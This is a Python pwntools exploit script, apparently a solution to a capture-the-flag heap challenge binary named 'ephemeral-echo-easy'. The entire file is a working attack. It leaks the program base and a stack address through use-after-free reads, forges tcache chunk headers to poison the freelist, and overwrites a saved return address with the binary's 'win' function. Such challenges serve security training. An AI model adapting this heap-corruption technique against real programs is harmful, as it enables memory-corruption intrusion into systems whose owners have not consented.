#!/usr/bin/python3

from pwn import *
import re


context.arch = "amd64"
context.log_level = "error"

elf = context.binary = ELF("/challenge/ephemeral-echo-easy")

def malloc(io,index,size):
    payload = b"malloc "+str(index).encode() + b" " + str(size).encode()
    io.sendline(payload)
    return io

def read(io,index,size,data):
    payload = b"read " + str(index).encode() + b" " + str(size).encode() + b" " + data
    io.sendline(payload)
    return io

def echo(io,index,offset):
    payload  = b"echo "+ str(index).encode() + b" " + str(offset).encode()
    io.sendline(payload)
    return io

def free(io,index):
    payload = b"free " + str(index).encode()
    io.sendline(payload)
    return io

def puts(io,index):
    payload = b"puts " + str(index).encode()
    io.sendline(payload)
    return io

def scanf(io,index,data):
    payload = b"scanf "+ str(index).encode() + b" " + data
    io.sendline(payload)
    return io

def quit(io):
    io.sendline(b"quit")
    return io

def stack_free(io):
    io.sendline(b"stack_free")
    return io

def stack_scanf(io,data):
    payload = b"stack_scanf " + data
    io.sendline(payload)
    return io

def stack_malloc_win(io):
    io.sendline(b"stack_malloc_win")
    return io

def send_flag(io,secret):
    payload = b"send_flag " + secret
    io.sendline(payload)
    return io

def pie_base(io):
    io = malloc(io,0,0x20)
    io = free(io,0)
    io = echo(io,0,0)
    print(io.recvuntil(b"Data:").decode())
    data = int.from_bytes(io.recvline()[:-1],"little")
    base = data - next(elf.search(b"/bin/echo"))
    print(hex(base))
    return io,base 

def leak_stack(io):
    io = malloc(io,0,0x20)
    io = free(io,0)
    io = echo(io,0,8)
    print(io.recvuntil(b"echo").decode())
    data = int.from_bytes(io.recvline()[:-1],"little")
    print(hex(data))
    return io,data

def pie(io):
    io = malloc(io,0,32)
    io = malloc(io,1,32)
    io = malloc(io,2,32)
    io = malloc(io,3,32)
    io = malloc(io,4,32)
    io = free(io,1)
    io = free(io,2)
    io = free(io,3)
    io = echo(io,0,96)
    print(io.recvuntil(b"Data: ").decode())
    d = int.from_bytes(io.recvline()[:-1],"little")
    print(hex(d))
    io = free(io,4)
    payload = b"\x00" * 40 + p64(0x31) + p64(d) + b"\x00" * (48 - 16) + p64(0x31) + b"\x00" * 40 + p64(0x31) + b"\x00" * 40 + p64(0x31) + p64(d)
    io = read(io,0,len(payload),payload)
    io = malloc(io,3,32)
    io = malloc(io,4,32)
    io = malloc(io,5,32)

    io = free(io,4)
    io = echo(io,5,0)
    print(io.recvuntil(b"Data: ").decode())
    add = int.from_bytes(io.recvline()[:-1],"little")
    base = add - next(elf.search(b"/bin/echo"))
    return io,base


def stack(io):
    io = malloc(io,0,32)
    io = malloc(io,1,32)
    io = malloc(io,2,32)
    io = malloc(io,3,32)
    io = malloc(io,4,32)
    io = free(io,1)
    io = free(io,2)
    io = free(io,3)
    io = echo(io,0,96)
    print(io.recvuntil(b"Data: ").decode())
    d = int.from_bytes(io.recvline()[:-1],"little")
    print(hex(d))
    io = free(io,4)
    payload = b"\x00" * 40 + p64(0x31) + p64(d) + b"\x00" * (48 - 16) + p64(0x31) + b"\x00" * 40 + p64(0x31) + b"\x00" * 40 + p64(0x31) + p64(d)
    io = read(io,0,len(payload),payload)
    io = malloc(io,3,32)
    io = malloc(io,4,32)
    io = malloc(io,5,32)

    io = free(io,4)
    io = echo(io,5,8)
    print(io.recvuntil(b"Data: ").decode())
    add = int.from_bytes(io.recvline()[:-1],"little")
    print(hex(add))
    return io,add

data_add = 0x00007fffe08a70b2
rbp = 0x7fffe08a7220
ret = rbp + 8
offset = ret - data_add
io = process()
io,base = pie(io)
io,s = stack(io)
elf.address = base
io = malloc(io,0,24)
io = malloc(io,1,24)
io = malloc(io,2,24)
io = free(io,1)
io = free(io,2)
payload = b"\x00" * 24 + p64(0x21) + b"\x00" * 24 + p64(0x21) + p64(s + offset)
io = read(io,0,len(payload),payload)
io = malloc(io,3,24)
io = malloc(io,4,24)
io = read(io,4,8,p64(elf.sym.win))
io = quit(io)

io.interactive()

